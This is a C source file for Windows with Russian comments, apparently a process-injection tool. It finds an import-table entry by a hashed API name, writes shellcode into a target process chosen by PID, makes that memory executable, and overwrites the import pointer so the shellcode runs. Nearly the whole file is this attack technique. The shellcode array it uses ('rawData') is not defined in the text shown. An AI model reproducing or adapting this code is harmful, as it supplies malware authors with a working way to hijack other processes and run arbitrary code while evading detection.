#include <Windows.h>
#include <stdio.h>

#define SEED 0x2D337E32
#define NtAllocateVirtualMemory_CRC32    0xC9C328F5

// Функция которая принимает строку и возвращает от нее хэш CRC32

unsigned int crc32(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 >> 1,
        g2 = g0 >> 2, g3 = g0 >> 3, g4 = g0 >> 4, g5 = g0 >> 5,
        g6 = (g0 >> 6) ^ g0, g7 = ((g0 >> 6) ^ g0) >> 1;
    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {
        crc = crc ^ byte;
        c = ((crc << 31 >> 31) & g7) ^ ((crc << 30 >> 31) & g6) ^
            ((crc << 29 >> 31) & g5) ^ ((crc << 28 >> 31) & g4) ^
            ((crc << 27 >> 31) & g3) ^ ((crc << 26 >> 31) & g2) ^
            ((crc << 25 >> 31) & g1) ^ ((crc << 24 >> 31) & g0);
        crc = ((unsigned)crc >> 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

#define HASH(API) crc32((char*)API)
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

/* Функция для нахождения адреса указателя на WinApi, которую мы будем хукать (перезаписывать шеллкодом)*/
ULONG_PTR find_iat_entry(HMODULE base, DWORD64 prochash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base; // Получим DOS-заголовок 
    PIMAGE_NT_HEADERS nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew); // Получим NT-заголовки 
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // Получим RVA директории импорта
    if(!rva) return 0;
    PIMAGE_IMPORT_DESCRIPTOR imp_desc = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, base, rva); // Получим VA директории импорта
    while(imp_desc->FirstThunk != 0 && imp_desc->OriginalFirstThunk != 0) {
        PIMAGE_THUNK_DATA import_addresses = RVA2VA(PIMAGE_THUNK_DATA, base, imp_desc->FirstThunk); // Получим VA массива структур с адресами функций
        PIMAGE_THUNK_DATA import_info = RVA2VA(PIMAGE_THUNK_DATA, base, imp_desc->OriginalFirstThunk); // Получим VA массива структур с именами функций

        while(*(ULONG_PTR*)import_addresses) {
            PIMAGE_IMPORT_BY_NAME function = RVA2VA(PIMAGE_IMPORT_BY_NAME, base, import_info->u1.AddressOfData); // Найдем адрес этой структуры чтобы определить имя функции
            LPCSTR func_name = function->Name; // Создадим локальную переменную которая указывает на имя функции
            printf("[i] Found function name: %s\n", func_name); // Выведем имя функции в консоль (на всякий)
            ULONG_PTR function_entry = (ULONG_PTR)&import_addresses->u1.Function; // Найдем адрес указателя на функцию

            if(HASH(func_name) == prochash) { // Сравним хэш найденного имени функции с нужным нам хэшем
                return function_entry; // Вернем адрес указателя на функцию, которую будем хукать
            }
            ++import_addresses; // Продолжаем поиски
            ++import_info;
        }
        ++imp_desc;

    }
    return 0;
}

BOOL hook_remote_iat(DWORD pid, PBYTE shellcode, SIZE_T shell_size, ULONG_PTR iatentry){
    HANDLE hProcess;
    SIZE_T byteswritten;
    LPVOID remote_base;
    DWORD  oldprotect;

    hProcess = OpenProcess(GENERIC_WRITE, 0, pid); // Попытаемся открыть дескриптор удаленного процесса
    if (!hProcess){
        printf("[!] Unable to open process handle!\n");
		return FALSE;
	}

    remote_base = VirtualAllocEx(hProcess, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Выделим в удаленном процессе память под шеллкод
    if (!remote_base) {
        printf("[!] Unable to allocate memory for shellcode!\n");
		return FALSE;
	}

    if(!(WriteProcessMemory(hProcess, remote_base, shellcode, shell_size, &byteswritten)) || byteswritten == 0x00) { // Запишем шеллкод по только что выделенному адресу
        printf("[!] Unable to write shellcode to remote process!\n");
        return FALSE;
    }

    if(!(VirtualProtectEx(hProcess, remote_base, shell_size, PAGE_EXECUTE_READ, &oldprotect))) { // Сменим протекцию выделенной страницы памяти для шеллкода на исполняемую
        printf("[!] Unable to change protection to executable!\n");
        return FALSE;
    }
    if(!(VirtualProtectEx(hProcess, (LPVOID)iatentry, 0x1000, PAGE_READWRITE, &oldprotect))) { // Сменим протекцию указателя на адрес функции в удаленном процессе на записываемую
        printf("[!] Unable to change protection to writable (Function entry)!\n");
        return FALSE;
    }

    if(!(WriteProcessMemory(hProcess, (LPVOID)iatentry, &remote_base, sizeof(&remote_base), &byteswritten)) || byteswritten == 0x00) { // Перезапишем указатель на функцию указателем на наш шеллкод
        printf("[!] Unable to hook function entry in remote process!\n");
        return FALSE;
    }

    return TRUE;

}

int main(int argc, char* argv[]) {
    HMODULE kernelbase;
    ULONG_PTR function;
    if(argc < 2) {
        printf("[i] Usage: iat_hooker.exe <PID>\n");
        return 0;
    }
    
    printf("PID: %i\n", atoi(argv[1]));

    kernelbase = GetModuleHandleA("kernelbase.dll");
    if(!kernelbase){
        printf("[!] Unable to get DLL base address!\n");
    }
    function = find_iat_entry(kernelbase, NtAllocateVirtualMemory_CRC32);
    if(!function){
        printf("[!] Unable to find func address!\n");
        return 1;
    }
    printf("[+] Found func entry: %llu\n", function);

    if(!hook_remote_iat(atoi(argv[1]), rawData, sizeof(rawData), function)){
        printf("[!] Unable to hook func!\n");
        return 1;
    }

    getchar();
}